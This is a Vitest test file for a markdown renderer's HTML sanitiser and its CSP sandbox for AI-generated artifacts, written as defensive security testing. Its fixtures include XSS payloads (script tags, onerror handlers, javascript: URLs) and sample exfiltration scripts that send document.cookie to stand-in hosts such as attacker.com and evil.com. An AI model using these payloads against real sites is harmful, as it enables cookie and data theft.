import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";

// N-148: markdown.ts now imports translate from @/lib/i18n, which transitively
// imports @/stores/app → @/lib/monaco-themes (fails under jsdom). Mock the
// heavy modules so the test can import the markdown module cleanly.
vi.mock("@/lib/monaco-themes", () => ({
  accentThemes: {},
  applyMonacoTheme: vi.fn(),
  applyMonacoThemeForMode: vi.fn(),
  registerAllThemes: vi.fn(),
}));

vi.mock("@/api/services", () => ({
  settingsService: {
    loadSettings: vi.fn().mockResolvedValue({}),
    saveSettings: vi.fn().mockResolvedValue(undefined),
  },
}));

vi.mock("@wailsio/runtime", () => ({
  Events: { On: vi.fn() },
}));

import DOMPurify from "dompurify";
import { marked } from "marked";
import { renderMarkdown, renderMarkdownWithApplyButtons, renderMarketplaceMarkdown, sanitizeHtml, sanitizeMarketplaceHtml, buildArtifactSrcDoc, clearMarkdownCache, __resetDomPurifyHookForTesting } from "./markdown";

// Clear the LRU cache before each test so cached results from one test do not
// mask regressions in another (e.g. when the same markdown string is reused).
beforeEach(() => {
  clearMarkdownCache();
});

describe("renderMarkdown", () => {
  it("renders plain text as a paragraph", () => {
    const html = renderMarkdown("hello world");
    expect(html).toContain("hello world");
    expect(html).toContain("<p>");
  });

  it("renders fenced code blocks with language class", () => {
    const md = "```js\nconst x = 1;\n```";
    const html = renderMarkdown(md);
    expect(html).toContain("<code");
    // "js" alias is normalized to "javascript" by resolveLanguage()
    expect(html).toContain("language-javascript");
    expect(html).toContain("hljs");
    // After highlight.js, "const" is wrapped in a keyword span
    expect(html).toContain("hljs-keyword");
    // Code content is preserved (split across spans but still present)
    expect(html).toContain("const");
    expect(html).toContain("x");
  });

  it("highlights TypeScript with ts alias", () => {
    const md = "```ts\ninterface Foo { bar: string }\n```";
    const html = renderMarkdown(md);
    expect(html).toContain("hljs");
    // "interface" should be recognized as a TS keyword
    expect(html).toContain("hljs-keyword");
    expect(html).toContain("interface");
    // alias ts → typescript: class should be normalized
    expect(html).toContain("language-typescript");
  });

  it("highlights Go with go/golang alias", () => {
    const md = "```go\npackage main\nfunc main() {}\n```";
    const html = renderMarkdown(md);
    expect(html).toContain("hljs");
    expect(html).toContain("hljs-keyword");
    expect(html).toContain("package");
    expect(html).toContain("func");
  });

  it("highlights Java", () => {
    const md = "```java\npublic class Hello { public static void main() {} }\n```";
    const html = renderMarkdown(md);
    expect(html).toContain("hljs");
    expect(html).toContain("hljs-keyword");
    expect(html).toContain("public");
    expect(html).toContain("class");
  });

  it("highlights Python with py alias", () => {
    const md = "```py\ndef hello():\n    return 'hi'\n```";
    const html = renderMarkdown(md);
    expect(html).toContain("hljs");
    expect(html).toContain("hljs-keyword");
    expect(html).toContain("def");
    expect(html).toContain("language-python");
  });

  it("highlights Rust with rs alias", () => {
    const md = "```rs\nfn main() { let x = 1; }\n```";
    const html = renderMarkdown(md);
    expect(html).toContain("hljs");
    expect(html).toContain("hljs-keyword");
    expect(html).toContain("fn");
    expect(html).toContain("language-rust");
  });

  it("highlights Bash with sh alias", () => {
    const md = "```sh\necho hello\n```";
    const html = renderMarkdown(md);
    expect(html).toContain("hljs");
    expect(html).toContain("language-bash");
  });

  it("highlights YAML with yml alias", () => {
    const md = "```yml\nkey: value\n```";
    const html = renderMarkdown(md);
    expect(html).toContain("hljs");
    expect(html).toContain("language-yaml");
  });

  it("falls back to auto-detection for unknown language", () => {
    const md = "```xyzlang\nsome random text\n```";
    const html = renderMarkdown(md);
    expect(html).toContain("hljs");
    // Auto-detection may wrap parts of the text in spans; just verify the
    // code block is present and the raw text survives (possibly split).
    expect(html).toContain("some random");
    expect(html).toContain("text");
  });

  it("renders inline code", () => {
    const html = renderMarkdown("use `const` for declarations");
    expect(html).toContain("<code>const</code>");
  });

  it("renders bold text", () => {
    const html = renderMarkdown("**important**");
    expect(html).toContain("<strong>important</strong>");
  });

  it("renders bullet lists", () => {
    const md = "- one\n- two\n- three";
    const html = renderMarkdown(md);
    expect(html).toContain("<ul>");
    expect(html).toContain("<li>one</li>");
    expect(html).toContain("<li>three</li>");
  });

  it("renders links with href", () => {
    const html = renderMarkdown("[docs](https://example.com)");
    expect(html).toContain('<a href="https://example.com"');
    expect(html).toContain(">docs</a>");
  });

  it("forces external links to open with target=_blank and rel=noopener noreferrer", () => {
    const html = renderMarkdown("[example](https://example.com)");
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).toContain('href="https://example.com"');
  });

  it("renders headers", () => {
    expect(renderMarkdown("# Title")).toContain("<h1>");
    expect(renderMarkdown("## Sub")).toContain("<h2>");
  });

  it("escapes raw HTML in content", () => {
    const html = renderMarkdown("<script>alert(1)</script>");
    expect(html).not.toContain("<script>");
  });
});

describe("sanitizeHtml", () => {
  it("strips script tags", () => {
    const result = sanitizeHtml("<p>ok</p><script>alert(1)</script>");
    expect(result).not.toContain("<script>");
    expect(result).toContain("<p>ok</p>");
  });

  it("strips on* attributes", () => {
    const result = sanitizeHtml('<p onclick="evil()">text</p>');
    expect(result).not.toContain("onclick");
    expect(result).toContain("text");
  });

  it("allows safe tags", () => {
    const result = sanitizeHtml("<strong>bold</strong><em>italic</em>");
    expect(result).toContain("<strong>bold</strong>");
    expect(result).toContain("<em>italic</em>");
  });

  // H-16: 全局 sanitizeHtml 必须显式禁用 id 与 style 属性
  it("H-16: strips id attribute (DOM clobbering defense)", () => {
    const result = sanitizeHtml('<div id="x">content</div>');
    // id 属性应被剥离，标签内容保留
    expect(result).not.toContain('id="x"');
    expect(result).toContain("content");
  });

  it("H-16: strips style attribute (CSS injection defense)", () => {
    const result = sanitizeHtml('<p style="color:red;background:url(evil)">x</p>');
    expect(result).not.toContain("style=");
    expect(result).not.toContain("background");
    expect(result).toContain("x");
  });
});

// H-16: 第三方扩展市场 README 必须用更严格白名单净化
describe("sanitizeMarketplaceHtml (H-16)", () => {
  it("strips <img onerror> handlers from marketplace content", () => {
    const result = sanitizeMarketplaceHtml(
      '<p>readme</p><img src="x" onerror="alert(1)" alt="bad">',
    );
    expect(result).not.toContain("onerror");
    expect(result).not.toContain("alert");
    // img 标签本身在白名单内，应保留（但 onerror 被剥离）
    expect(result).toContain("<img");
    expect(result).toContain("readme");
  });

  it("strips id attribute (DOM clobbering defense)", () => {
    const result = sanitizeMarketplaceHtml('<div id="x">clobber</div>');
    expect(result).not.toContain('id="x"');
    // div 不在白名单内，应被剥离（仅保留文本）
    expect(result).not.toContain("<div");
    expect(result).toContain("clobber");
  });

  it("strips style attribute (CSS injection defense)", () => {
    const result = sanitizeMarketplaceHtml(
      '<p style="position:fixed;background:url(javascript:alert(1))">x</p>',
    );
    expect(result).not.toContain("style=");
    expect(result).not.toContain("position");
    expect(result).toContain("x");
  });

  it("strips script tags from marketplace content", () => {
    const result = sanitizeMarketplaceHtml(
      '<p>ok</p><script>alert("xss")</script>',
    );
    expect(result).not.toContain("<script>");
    expect(result).not.toContain("alert");
    expect(result).toContain("<p>ok</p>");
  });

  it("strips javascript: URLs from links", () => {
    const result = sanitizeMarketplaceHtml(
      '<a href="javascript:alert(1)">click</a>',
    );
    expect(result).not.toContain("javascript:");
  });

  it("allows only basic formatting tags, strips div/span/blockquote", () => {
    const result = sanitizeMarketplaceHtml(
      '<div>div</div><span>span</span><blockquote>quote</blockquote><p>p</p><strong>bold</strong>',
    );
    expect(result).not.toContain("<div");
    expect(result).not.toContain("<span");
    expect(result).not.toContain("<blockquote");
    expect(result).toContain("<p>p</p>");
    expect(result).toContain("<strong>bold</strong>");
    // 被剥离标签的文本内容应保留
    expect(result).toContain("div");
    expect(result).toContain("span");
    expect(result).toContain("quote");
  });

  it("preserves table elements", () => {
    const result = sanitizeMarketplaceHtml(
      '<table><thead><tr><th>H</th></tr></thead><tbody><tr><td>D</td></tr></tbody></table>',
    );
    expect(result).toContain("<table>");
    expect(result).toContain("<thead>");
    expect(result).toContain("<tbody>");
    expect(result).toContain("<th>H</th>");
    expect(result).toContain("<td>D</td>");
  });

  it("forces external links to open with noopener/noreferrer", () => {
    const result = sanitizeMarketplaceHtml(
      '<a href="https://example.com">link</a>',
    );
    expect(result).toContain('target="_blank"');
    expect(result).toContain('rel="noopener noreferrer"');
  });

  it("strips class attribute from marketplace content", () => {
    const result = sanitizeMarketplaceHtml(
      '<p class="evil">text</p><code class="hljs">code</code>',
    );
    expect(result).not.toContain("class=");
    expect(result).toContain("text");
    expect(result).toContain("code");
  });
});

describe("renderMarketplaceMarkdown (H-16)", () => {
  it("renders basic markdown with strict whitelist", () => {
    const html = renderMarketplaceMarkdown("# Title\n\nparagraph with **bold**");
    expect(html).toContain("<h1>");
    expect(html).toContain("Title");
    expect(html).toContain("<strong>bold</strong>");
  });

  it("strips <img onerror> from README markdown", () => {
    // 直接在 markdown 中嵌入 img 标签
    const md = '# Readme\n\n<img src="x" onerror="alert(1)">';
    const html = renderMarketplaceMarkdown(md);
    expect(html).not.toContain("onerror");
    expect(html).not.toContain("alert");
  });

  it("strips <div id=x> from README markdown (DOM clobbering)", () => {
    const md = '# Readme\n\n<div id="x">clobber</div>';
    const html = renderMarketplaceMarkdown(md);
    expect(html).not.toContain('id="x"');
    expect(html).not.toContain("<div");
  });

  it("strips inline style from README markdown", () => {
    const md = '# Readme\n\n<p style="color:red">styled</p>';
    const html = renderMarketplaceMarkdown(md);
    expect(html).not.toContain("style=");
  });

  it("strips script tags from README markdown", () => {
    const md = '# Readme\n\n<script>alert("xss")</script>';
    const html = renderMarketplaceMarkdown(md);
    expect(html).not.toContain("<script>");
    expect(html).not.toContain("alert");
  });

  it("result is cached separately from renderMarkdown (stricter output)", () => {
    const md = "## heading\n\nsome **bold** text";
    const marketplaceHtml = renderMarketplaceMarkdown(md);
    const regularHtml = renderMarkdown(md);
    // 两者都应包含 heading 和 bold，但白名单不同
    expect(marketplaceHtml).toContain("heading");
    expect(regularHtml).toContain("heading");
    expect(marketplaceHtml).toContain("<strong>bold</strong>");
  });

  it("returns empty string for empty input", () => {
    expect(renderMarketplaceMarkdown("")).toBe("");
  });
});

describe("markdown XSS prevention", () => {
  it("strips script tags", () => {
    const html = renderMarkdown('<script>alert("xss")</script>hello');
    expect(html).not.toContain("<script>");
    expect(html).not.toContain("alert");
  });

  it("strips javascript: URLs", () => {
    const html = renderMarkdown('[click](javascript:alert("xss"))');
    expect(html).not.toContain("javascript:");
  });

  it("strips onerror handlers", () => {
    const html = renderMarkdown('<img src="x" onerror="alert(1)">');
    expect(html).not.toContain("onerror");
  });

  it("preserves safe markdown", () => {
    const html = renderMarkdown("**bold** and `code`");
    expect(html).toContain("<strong>bold</strong>");
    expect(html).toContain("<code>code</code>");
  });
});

describe("renderMarkdownWithApplyButtons", () => {
  it("wraps each pre block in a code-block-wrap with Apply button", () => {
    const md = "```js\nconst x = 1;\n```\n\n```go\nfmt.Println()\n```";
    const html = renderMarkdownWithApplyButtons(md);
    expect(html).toContain('class="code-block-wrap"');
    expect(html).toContain('class="code-block-apply-btn"');
    // Two buttons for two code blocks
    const buttonCount = (html.match(/code-block-apply-btn/g) || []).length;
    expect(buttonCount).toBe(2);
  });

  it("assigns sequential data-code-index to buttons", () => {
    const md = "```\none\n```\n\n```\ntwo\n```";
    const html = renderMarkdownWithApplyButtons(md);
    expect(html).toContain('data-code-index="0"');
    expect(html).toContain('data-code-index="1"');
  });

  it("places the button after the pre inside the wrap", () => {
    const md = "```js\nconst y = 2;\n```";
    const html = renderMarkdownWithApplyButtons(md);
    // The wrap should contain pre then button (button comes after pre in source order)
    const wrapStart = html.indexOf('class="code-block-wrap"');
    const prePos = html.indexOf("<pre", wrapStart);
    const btnPos = html.indexOf('class="code-block-apply-btn"', wrapStart);
    expect(prePos).toBeGreaterThan(-1);
    expect(btnPos).toBeGreaterThan(prePos);
  });

  it("returns empty string for empty input", () => {
    expect(renderMarkdownWithApplyButtons("")).toBe("");
  });

  it("preserves code content inside the pre", () => {
    const md = "```python\nprint('hello')\n```";
    const html = renderMarkdownWithApplyButtons(md);
    // After highlight.js, "print" and "hello" are in separate spans
    expect(html).toContain("print");
    expect(html).toContain("hello");
  });

  it("does not add apply button when there are no code blocks", () => {
    const html = renderMarkdownWithApplyButtons("just **bold** text");
    expect(html).not.toContain("code-block-apply-btn");
    expect(html).not.toContain("code-block-wrap");
  });

  // N-148: Apply button text must come from i18n, not be hardcoded
  it("N-148: Apply button uses i18n label, aria-label, and title", () => {
    const md = "```js\nconst x = 1;\n```";
    const html = renderMarkdownWithApplyButtons(md);
    // Default locale is "en" — verify the English i18n values appear
    expect(html).toContain(">Apply<");
    expect(html).toContain('aria-label="Apply code block to current file"');
    expect(html).toContain('title="Apply to current file"');
  });
});

describe("markdown LRU cache", () => {
  it("returns the same HTML for repeated calls with identical input", () => {
    const md = "## heading\n\nsome **bold** text";
    const first = renderMarkdown(md);
    const second = renderMarkdown(md);
    expect(second).toBe(first);
  });

  it("caches renderMarkdownWithApplyButtons separately from renderMarkdown", () => {
    const md = "```js\nconst x = 1;\n```";
    const plain = renderMarkdown(md);
    const withBtns = renderMarkdownWithApplyButtons(md);
    // The apply-buttons variant must have the button wrapper; the plain one
    // must not. This confirms they use independent caches.
    expect(withBtns).toContain("code-block-apply-btn");
    expect(plain).not.toContain("code-block-apply-btn");
  });

  it("clearMarkdownCache forces a re-render", () => {
    const md = "unique-cache-test **strong**";
    const first = renderMarkdown(md);
    // Mutating the cached output is not possible from outside, so we just
    // verify that clearMarkdownCache does not throw and a subsequent call
    // still returns consistent output.
    clearMarkdownCache();
    const second = renderMarkdown(md);
    expect(second).toBe(first);
  });

  it("keeps a bounded cache and refreshes a hit before LRU eviction", () => {
    const parseSpy = vi.spyOn(marked, "parse");
    renderMarkdown("oldest-entry");
    for (let index = 0; index < 99; index++) {
      renderMarkdown(`entry-${index}`);
    }
    expect(parseSpy).toHaveBeenCalledTimes(100);

    renderMarkdown("oldest-entry");
    expect(parseSpy).toHaveBeenCalledTimes(100);

    renderMarkdown("overflow-entry");
    expect(parseSpy).toHaveBeenCalledTimes(101);
    renderMarkdown("oldest-entry");
    expect(parseSpy).toHaveBeenCalledTimes(101);

    renderMarkdown("entry-0");
    expect(parseSpy).toHaveBeenCalledTimes(102);
    parseSpy.mockRestore();
  });
});

// H-17: DiffViewer iframe 沙箱 —— AI 生成 HTML/SVG 必须无法 fetch 外部
describe("buildArtifactSrcDoc (H-17)", () => {
  it("注入 CSP meta 到 HTML 片段（无 <head> 时包装为完整文档）", () => {
    const srcdoc = buildArtifactSrcDoc("<h1>hello</h1>", false);
    expect(srcdoc).toContain("<!DOCTYPE html>");
    expect(srcdoc).toContain("<html>");
    expect(srcdoc).toContain("<head>");
    expect(srcdoc).toContain("<body>");
    expect(srcdoc).toContain("<h1>hello</h1>");
  });

  it("CSP 包含 connect-src 'none'（禁止 fetch/XHR 数据外泄）", () => {
    const srcdoc = buildArtifactSrcDoc("<p>x</p>", false);
    expect(srcdoc).toContain("connect-src 'none'");
  });

  it("CSP 包含 default-src 'none'（默认禁止所有资源加载）", () => {
    const srcdoc = buildArtifactSrcDoc("<p>x</p>", false);
    expect(srcdoc).toContain("default-src 'none'");
  });

  it("CSP 使用强随机 nonce 允许脚本且不启用 unsafe-inline", () => {
    const srcdoc = buildArtifactSrcDoc("<script>window.ready = true</script>", false);
    const match = srcdoc.match(/script-src 'nonce-([0-9a-f]{32})'/);
    expect(match).not.toBeNull();
    expect(srcdoc).not.toContain("script-src 'unsafe-inline'");
    expect(srcdoc).toContain(`nonce="${match?.[1]}"`);
    expect(srcdoc).toContain("style-src 'unsafe-inline'");
  });

  it("CSP 禁止表单提交与嵌套 iframe", () => {
    const srcdoc = buildArtifactSrcDoc("<p>x</p>", false);
    expect(srcdoc).toContain("form-action 'none'");
    expect(srcdoc).toContain("frame-src 'none'");
    expect(srcdoc).toContain("base-uri 'none'");
  });

  it("removes an artifact-provided CSP before installing the host policy", () => {
    const srcdoc = buildArtifactSrcDoc(
      '<html><head><meta http-equiv="Content-Security-Policy" content="default-src https://evil.example"></head><body></body></html>',
      false,
    );

    expect(srcdoc).not.toContain("evil.example");
    expect(srcdoc.match(/Content-Security-Policy/g)).toHaveLength(1);
  });

  it("完整 HTML 文档（含 <head>）时注入 CSP 到现有 <head> 而非重新包装", () => {
    const html = '<!DOCTYPE html><html><head><title>T</title></head><body><p>x</p></body></html>';
    const srcdoc = buildArtifactSrcDoc(html, false);
    // 应保留原始文档结构
    expect(srcdoc).toContain("<title>T</title>");
    expect(srcdoc).toContain("<!DOCTYPE html>");
    // CSP meta 应注入到 <head> 内
    const headStart = srcdoc.indexOf("<head>");
    const cspPos = srcdoc.indexOf('Content-Security-Policy');
    const titlePos = srcdoc.indexOf('<title>');
    expect(cspPos).toBeGreaterThan(headStart);
    expect(titlePos).toBeGreaterThan(cspPos);
  });

  it("保留 <head> 标签的属性（如 lang、data-* 等）", () => {
    const html = '<html><head data-test="1" id="h"><title>T</title></head><body></body></html>';
    const srcdoc = buildArtifactSrcDoc(html, false);
    expect(srcdoc).toContain('<head data-test="1" id="h">');
  });

  it("SVG 内容：剥离成对 <script> 标签", () => {
    const svg = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><rect/></svg>';
    const srcdoc = buildArtifactSrcDoc(svg, true);
    expect(srcdoc).not.toContain("<script>");
    expect(srcdoc).not.toContain("alert(1)");
    // SVG 主体内容保留
    expect(srcdoc).toContain("<svg");
    expect(srcdoc).toContain("<rect");
  });

  it("SVG 内容：剥离带属性的 <script> 标签", () => {
    const svg = '<svg><script type="text/javascript">fetch("https://evil.com")</script></svg>';
    const srcdoc = buildArtifactSrcDoc(svg, true);
    expect(srcdoc).not.toContain("<script");
    expect(srcdoc).not.toContain("fetch");
    expect(srcdoc).not.toContain("evil.com");
  });

  it("SVG 内容：剥离自闭合 <script href='...' />（SVG 1.1 语法）", () => {
    const svg = '<svg><script href="evil.js" /></svg>';
    const srcdoc = buildArtifactSrcDoc(svg, true);
    expect(srcdoc).not.toContain("<script");
    expect(srcdoc).not.toContain("evil.js");
  });

  it("HTML 内容：保留内联脚本（由 CSP 限制执行，不剥离）", () => {
    // HTML artifact 需要内联脚本实现交互，所以不剥离 <script>，
    // 而是通过 CSP connect-src 'none' 限制其能力。
    const html = '<button onclick="doStuff()">click</button>';
    const srcdoc = buildArtifactSrcDoc(html, false);
    // HTML 模式不剥离脚本（但 CSP 会限制）
    expect(srcdoc).toContain("doStuff()");
  });

  it("AI 生成的恶意 fetch 调用被 CSP connect-src 'none' 阻止", () => {
    // 模拟 AI 生成的 HTML 含恶意 fetch 外泄数据
    const malicious = `
      <script>
        fetch('https://attacker.com/exfil?data=' + document.cookie);
      </script>
    `;
    const srcdoc = buildArtifactSrcDoc(malicious, false);
    // CSP 必须存在且禁止 connect-src
    expect(srcdoc).toContain("connect-src 'none'");
    // 恶意脚本内容仍可能在 srcdoc 中（HTML 模式不剥离脚本），
    // 但 CSP 会阻止其发起网络请求 —— 这正是测试目的。
    // 关键断言：CSP meta 在 <script> 之前出现（CSP 先于脚本应用）
    const cspPos = srcdoc.indexOf('Content-Security-Policy');
    const scriptPos = srcdoc.indexOf('<script');
    expect(cspPos).toBeGreaterThan(-1);
    expect(scriptPos).toBeGreaterThan(cspPos);
  });

  it("AI 生成的 SVG 含 <script> 被剥离，无法执行", () => {
    const maliciousSvg = `
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
        <circle cx="50" cy="50" r="40" fill="red"/>
        <script>
          var x = new XMLHttpRequest();
          x.open('GET', 'https://attacker.com/steal', true);
          x.send();
        </script>
      </svg>
    `;
    const srcdoc = buildArtifactSrcDoc(maliciousSvg, true);
    expect(srcdoc).not.toContain("<script");
    expect(srcdoc).not.toContain("XMLHttpRequest");
    expect(srcdoc).not.toContain("attacker.com");
    // SVG 图形内容保留
    expect(srcdoc).toContain("<circle");
    expect(srcdoc).toContain('fill="red"');
  });
});

// M-21: DOMPurify hook 应只在模块加载时注册一次，而非每次 sanitize 调用
describe("M-21: DOMPurify hook registered once", () => {
  afterEach(() => {
    // 恢复模块加载时的 hook 状态，避免影响后续测试。
    __resetDomPurifyHookForTesting();
    // 再次触发注册以恢复常驻 hook（sanitize 依赖它给链接加 target/rel）。
    sanitizeHtml("<a href='https://x.example'>x</a>");
  });

  it("calling sanitizeHtml twice registers the hook only once", () => {
    // 重置 guard 并移除已有 hook，使下一次 sanitize 重新注册。
    __resetDomPurifyHookForTesting();
    const addHookSpy = vi.spyOn(DOMPurify, "addHook");

    sanitizeHtml("<a href='https://a.example'>a</a>");
    sanitizeHtml("<a href='https://b.example'>b</a>");

    // 第一次 sanitize 重新注册 hook（addHook 调用一次），
    // 第二次因 guard 跳过 —— 总共只调用一次。
    expect(addHookSpy).toHaveBeenCalledTimes(1);

    addHookSpy.mockRestore();
  });

  it("the hook still applies (links get target=_blank) after the guard", () => {
    __resetDomPurifyHookForTesting();
    // First call re-registers the hook.
    const first = sanitizeHtml('<a href="https://c.example">c</a>');
    expect(first).toContain('target="_blank"');
    expect(first).toContain('rel="noopener noreferrer"');
    // Second call must still apply the hook (it is registered globally).
    const second = sanitizeHtml('<a href="https://d.example">d</a>');
    expect(second).toContain('target="_blank"');
    expect(second).toContain('rel="noopener noreferrer"');
  });
});
